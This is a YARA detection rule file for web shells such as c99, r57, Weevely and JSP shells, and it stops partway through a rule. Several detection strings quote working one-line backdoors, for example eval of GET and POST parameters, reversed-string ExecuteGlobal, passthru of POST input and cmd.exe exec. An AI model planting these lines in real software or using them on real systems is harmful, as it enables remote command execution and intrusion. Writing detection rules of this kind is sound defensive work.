rule SSC_down_rar_Folder_down {
meta:
description = "Webshells Auto-generated - file down.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "db47d7a12b3584a2e340567178886e71"
strings:
$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
condition:
all of them
}
rule SSC_Casus15_php_php {
meta:
description = "Semi-Auto-generated  - file Casus15.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
strings:
$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
$s3 = "value='Calistirmak istediginiz "
condition:
1 of them
}
rule SSC_Weevely_Webshell : webshell {
meta:
description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
author = "Florian Roth"
reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"
date = "2014/12/14"
score = 60
strings:
$php = "<?php" ascii
$s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
$s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
$s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
$s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
condition:
$php at 0 and all of ($s*) and filesize > 570 and filesize < 800
}
rule SSC_webshell_c99_c66_c99_shadows_mod_c99shell {
meta:
description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
hash3 = "048ccc01b873b40d57ce25a4c56ea717"
strings:
$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
condition:
2 of them
}
rule SSC_webshell_wsb_idc {
meta:
description = "Web Shell - file idc.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "7c5b1b30196c51f1accbffb80296395f"
strings:
$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
$s3 = "{eval($_GET['idc']);}" fullword
condition:
1 of them
}
rule SSC_cmdjsp_jsp {
meta:
description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "b815611cc39f17f05a73444d699341d4"
strings:
$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
$s2 = "cmdjsp.jsp"
$s3 = "michaeldaw.org" fullword
condition:
2 of them
}
rule SSC_webshell_PHP_150 {
meta:
description = "Web Shell - file 150.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "400c4b0bed5c90f048398e1d268ce4dc"
strings:
$s0 = "HJ3HjqxclkZfp"
$s1 = "<? eval(gzinflate(base64_decode('" fullword
condition:
all of them
}
rule SSC_multiple_webshells_0031 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_r577_php_php_r57_php_php_spy_php_php_s_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
hash3 = "817671e1bdc85e04cc3440bbd9288800"
strings:
$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
$s2 = "'eng_text30'=>'Cat file'," fullword
$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
condition:
1 of them
}
rule SSC_webshell_Dx_Dx {
meta:
description = "Web Shell - file Dx.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
strings:
$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
$s9 = "class=linelisting><nobr>POST (php eval)</td><"
condition:
1 of them
}
rule SSC_webshell_jsp_zx {
meta:
description = "Web Shell - file zx.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "67627c264db1e54a4720bd6a64721674"
strings:
$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
condition:
all of them
}
rule SSC_webshell_jsp_guige {
meta:
description = "Web Shell - file guige.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "2c9f2dafa06332957127e2c713aacdd2"
strings:
$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
condition:
all of them
}
rule SSC_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php {
meta:
description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "49ad9117c96419c35987aaa7e2230f63"
strings:
$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
$s1 = "Mode Shell v1.0</font></span>"
$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."
condition:
1 of them
}
rule SSC_webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
meta:
description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "36331f2c81bad763528d0ae00edf55be"
hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
hash2 = "8979594423b68489024447474d113894"
hash3 = "ec482fc969d182e5440521c913bab9bd"
hash4 = "f98d2b33cd777e160d1489afed96de39"
hash5 = "4b4c12b3002fad88ca6346a873855209"
hash6 = "e9a5280f77537e23da2545306f6a19ad"
hash7 = "598eef7544935cf2139d1eada4375bb5"
strings:
$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
condition:
2 of them
}
rule SSC_shell_php_php {
meta:
description = "Semi-Auto-generated  - file shell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "1a95f0163b6dea771da1694de13a3d8d"
strings:
$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
condition:
1 of them
}
rule SSC_FSO_s_indexer_2 {
meta:
description = "Webshells Auto-generated - file indexer.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "135fc50f85228691b401848caef3be9e"
strings:
$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
condition:
all of them
}
rule SSC_webshell_jsp_tree {
meta:
description = "Web Shell - file tree.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
strings:
$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
condition:
all of them
}
rule SSC_webshell_mumaasp_com {
meta:
description = "Web Shell - file mumaasp.com.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "cce32b2e18f5357c85b6d20f564ebd5d"
strings:
$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
condition:
all of them
}
rule SSC_webshell_webshells_new_asp1 {
meta:
description = "Web shells - generated from file asp1.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "b63e708cd58ae1ec85cf784060b69cad"
strings:
$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
condition:
1 of them
}
rule SSC_WebShell_Uploader {
meta:
description = "PHP Webshells Github Archive - file Uploader.php"
author = "Florian Roth"
hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
strings:
$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
condition:
all of them
}
rule SSC_asp_proxy : webshell {
meta:
description = "Laudanum Injector Tools - file proxy.asp"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "51e97040d1737618b1775578a772fa6c5a31afd8"
strings:
$s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
$s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii /* PEStudio Blacklist: strings */
$s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii /* PEStudio Blacklist: strings */
$s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii /* PEStudio Blacklist: strings */
condition:
filesize < 50KB and all of them
}
rule SSC_ZXshell2_0_rar_Folder_nc {
meta:
description = "Webshells Auto-generated - file nc.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
strings:
$s0 = "WSOCK32.dll"
$s1 = "?bSUNKNOWNV"
$s7 = "p@gram Jm6h)"
$s8 = "ser32.dllCONFP@"
condition:
all of them
}
rule SSC_phpspy_2005_full {
meta:
description = "Webshells Auto-generated - file phpspy_2005_full.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "d1c69bb152645438440e6c903bac16b2"
strings:
$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
condition:
all of them
}
rule SSC_webshell_caidao_shell_hkmjj {
meta:
description = "Web Shell - file hkmjj.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "e7b994fe9f878154ca18b7cde91ad2d0"
strings:
$s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
condition:
all of them
}
rule SSC_backup_php_often_with_c99shell {
meta:
description = "Semi-Auto-generated  - file backup.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "aeee3bae226ad57baf4be8745c3f6094"
strings:
$s0 = "#phpMyAdmin MySQL-Dump" fullword
$s2 = ";db_connect();header('Content-Type: application/octetstr"
$s4 = "$data .= \"#Database: $database" fullword
condition:
all of them
}
rule SSC_JspWebshell_1_2_jsp {
meta:
description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "70a0ee2624e5bbe5525ccadc467519f6"
strings:
$s0 = "JspWebshell"
$s1 = "CreateAndDeleteFolder is error:"
$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
$s3 = "String _password =\"111\";"
condition:
2 of them
}
rule SSC_webshell_asp_ajn {
meta:
description = "Web Shell - file ajn.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "aaafafc5d286f0bff827a931f6378d04"
strings:
$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
condition:
all of them
}
rule SSC_webshell_2_520_icesword_job_ma1_ma4_2 {
meta:
description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "64a3bf9142b045b9062b204db39d4d57"
hash1 = "9abd397c6498c41967b4dd327cf8b55a"
hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
hash3 = "56c005690da2558690c4aa305a31ad37"
hash4 = "532b93e02cddfbb548ce5938fe2f5559"
hash5 = "6e0fa491d620d4af4b67bae9162844ae"
hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
strings:
$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
condition:
all of them
}
rule SSC_FSO_s_tool {
meta:
description = "Webshells Auto-generated - file tool.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "3a1e1e889fdd974a130a6a767b42655b"
strings:
$s7 = "\"\"%windir%\\\\calc.exe\"\")"
condition:
all of them
}
rule SSC_remview_2003_04_22 {
meta:
description = "Webshells Auto-generated - file remview_2003_04_22.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "17d3e4e39fbca857344a7650f7ea55e3"
strings:
$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
condition:
all of them
}
rule SSC_Test_php_php {
meta:
description = "Semi-Auto-generated  - file Test.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "77e331abd03b6915c6c6c7fe999fcb50"
strings:
$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
$s2 = "fwrite ($fp, \"$yazi\");" fullword
$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
condition:
1 of them
}
rule SSC_FeliksPack3___PHP_Shells_r57 {
meta:
description = "Webshells Auto-generated - file r57.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "903908b77a266b855262cdbce81c3f72"
strings:
$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
condition:
all of them
}
rule SSC_WebShell_hiddens_shell_v1 {
meta:
description = "PHP Webshells Github Archive - file hiddens shell v1.php"
author = "Florian Roth"
hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
strings:
$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
condition:
all of them
}
rule SSC_connector {
meta:
description = "Webshells Auto-generated - file connector.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "3ba1827fca7be37c8296cd60be9dc884"
strings:
$s2 = "If ( AttackID = BROADCAST_ATTACK )"
$s4 = "Add UNIQUE ID for victims / zombies"
condition:
all of them
}
rule SSC_fire2013 : webshell
{
meta:
author      = "Vlad https://github.com/vlad-s"
date        = "2016/07/18"
description = "Catches a webshell"
strings:
$a = "eval(\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61"
$b = "yc0CJYb+O//Xgj9/y+U/dd//vkf'\\x29\\x29\\x29\\x3B\")"
condition:
all of them
}
rule SSC_WebShell_php_webshells_spygrup {
meta:
description = "PHP Webshells Github Archive - file spygrup.php"
author = "Florian Roth"
hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
strings:
$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
$s18 = "By KingDefacer From Spygrup.org>" fullword
condition:
3 of them
}
rule SSC_HawkEye_PHP_Panel {
meta:
description = "Detects HawkEye Keyloggers PHP Panel"
author = "Florian Roth"
date = "2014/12/14"
score = 60
strings:
$s0 = "$fname = $_GET['fname'];" ascii fullword
$s1 = "$data = $_GET['data'];" ascii fullword
$s2 = "unlink($fname);" ascii fullword
$s3 = "echo \"Success\";" fullword ascii
condition:
all of ($s*) and filesize < 600
}
rule SSC_webshell_404_data_in_JFolder_jfolder01_xxx {
meta:
description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "7066f4469c3ec20f4890535b5f299122"
hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
hash3 = "8979594423b68489024447474d113894"
hash4 = "ec482fc969d182e5440521c913bab9bd"
hash5 = "f98d2b33cd777e160d1489afed96de39"
hash6 = "4b4c12b3002fad88ca6346a873855209"
hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
hash8 = "e9a5280f77537e23da2545306f6a19ad"
strings:
$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
condition:
all of them
}
rule SSC_webshell_c99_locus7s_c99_w4cking_xxx {
meta:
description = "Web Shell - from files c99_locus7s.php, c99_w4cking.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, acid.php, newsh.php, r57.php, Backdoor.PHP.Agent.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
hash1 = "9c34adbc8fd8d908cbb341734830f971"
hash2 = "ef43fef943e9df90ddb6257950b3538f"
hash3 = "ae025c886fbe7f9ed159f49593674832"
hash4 = "911195a9b7c010f61b66439d9048f400"
hash5 = "697dae78c040150daff7db751fc0c03c"
hash6 = "513b7be8bd0595c377283a7c87b44b2e"
hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
hash12 = "41af6fd253648885c7ad2ed524e0692d"
hash13 = "6fcc283470465eed4870bcc3e2d7f14d"
strings:
$s1 = "$res = @shell_exec($cfe);" fullword
$s8 = "$res = @ob_get_contents();" fullword
$s9 = "@exec($cfe,$res);" fullword
condition:
2 of them
}
rule SSC_FSO_s_zehir4_2 {
meta:
description = "Webshells Auto-generated - file zehir4.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5b496a61363d304532bcf52ee21f5d55"
strings:
$s4 = "\"Program Files\\Serv-u\\Serv"
condition:
all of them
}
rule SSC_FSO_s_RemExp_2 {
meta:
description = "Webshells Auto-generated - file RemExp.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b69670ecdbb40012c73686cd22696eeb"
strings:
$s2 = " Then Response.Write \""
$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
condition:
all of them
}
rule SSC_WebShell_php_webshells_cw {
meta:
description = "PHP Webshells Github Archive - file cw.php"
author = "Florian Roth"
hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
strings:
$s1 = "// Dump Database [pacucci.com]" fullword
$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword
condition:
3 of them
}
rule SSC_WebShell_Generic_PHP_9 {
meta:
description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
author = "Florian Roth"
super_rule = 1
hash0 = "89f2a7007a2cd411e0a7abd2ff5218d212b84d18"
hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
hash2 = "0daed818cac548324ad0c5905476deef9523ad73"
strings:
$s2 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";" fullword
$s6 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {" fullword
$s12 = "if (!empty($_POST['c'])){" fullword
$s13 = "passthru($_POST['c']);" fullword
$s16 = "<input type=\"radio\" name=\"tac\" value=\"1\">B64 Decode<br>" fullword
$s20 = "<input type=\"radio\" name=\"tac\" value=\"3\">md5 Hash" fullword
condition:
3 of them
}
rule SSC_Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php {
meta:
description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "6163b30600f1e80d2bb5afaa753490b6"
strings:
$s0 = "Safe0ver" fullword
$s1 = "Script Gecisi Tamamlayamadi!"
$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
condition:
1 of them
}
rule SSC_Release_dllTest {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "76a59fc3242a2819307bb9d593bef2e0"
strings:
$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
$s1 = "0 0&00060K0R0X0f0l0q0w0"
$s2 = ": :$:(:,:0:4:8:D:`=d="
$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
$s6 = "0)0O0\\0a0o0\"1E1P1q1"
$s7 = "<.<I<d<h<l<p<t<x<|<"
$s8 = "3&31383>3F3Q3X3`3f3w3|3"
$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
condition:
all of them
}
rule SSC_webshell_000_403_c5_queryDong_spyjsp2010_t00ls {
meta:
description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
hash1 = "059058a27a7b0059e2c2f007ad4675ef"
hash2 = "8b457934da3821ba58b06a113e0d53d9"
hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
hash4 = "655722eaa6c646437c8ae93daac46ae0"
hash5 = "9c94637f76e68487fa33f7b0030dd932"
strings:
$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
condition:
all of them
}
rule SSC_WebShell_php_webshells_cpanel {
meta:
description = "PHP Webshells Github Archive - file cpanel.php"
author = "Florian Roth"
hash = "433dab17106b175c7cf73f4f094e835d453c0874"
strings:
$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword
condition:
2 of them
}
rule SSC_WebShell_Generic_PHP_4 {
meta:
description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, nshell.php, Loaderz WEB Shell.php, stres.php"
author = "Florian Roth"
super_rule = 1
hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
hash2 = "86bc40772de71b1e7234d23cab355e1ff80c474d"
hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
strings:
$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
$s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword
$s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword
$s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword
$s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword
$s10 = "foreach ($arr as $filename) {" fullword
$s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword
condition:
all of them
}
rule SSC_webshell_PHP_r57142 {
meta:
description = "Web Shell - file r57142.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
strings:
$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
condition:
all of them
}
rule SSC_php_backdoor_php {
meta:
description = "Semi-Auto-generated  - file php-backdoor.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
strings:
$s0 = "http://michaeldaw.org   2006"
$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
$s3 = "coded by z0mbie"
condition:
1 of them
}
rule SSC_webshell_metaslsoft {
meta:
description = "Web Shell - file metaslsoft.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "aa328ed1476f4a10c0bcc2dde4461789"
strings:
$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
condition:
all of them
}
rule SSC_PHANTASMA_php {
meta:
description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "52779a27fa377ae404761a7ce76a5da7"
strings:
$s0 = ">[*] Safemode Mode Run</DIV>"
$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
$s2 = "[*] Spawning Shell"
$s3 = "Cha0s"
condition:
2 of them
}
rule SSC_webshell_Macker_s_Private_PHPShell {
meta:
description = "Web Shell - file Macker's Private PHPShell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "e24cbf0e294da9ac2117dc660d890bb9"
strings:
$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
condition:
all of them
}
rule SSC_multiple_webshells_0009 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash5 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "$sess_data[\"cut\"] = array(); c99_s"
$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
condition:
1 of them
}
rule SSC_webshell_GetPostpHp {
meta:
description = "Web shells - generated from file GetPostpHp.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "20ede5b8182d952728d594e6f2bb5c76"
strings:
$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
condition:
all of them
}
rule SSC_webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
meta:
description = "Web Shell - from files gfs_sh.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
hash1 = "ef43fef943e9df90ddb6257950b3538f"
hash2 = "ae025c886fbe7f9ed159f49593674832"
hash3 = "911195a9b7c010f61b66439d9048f400"
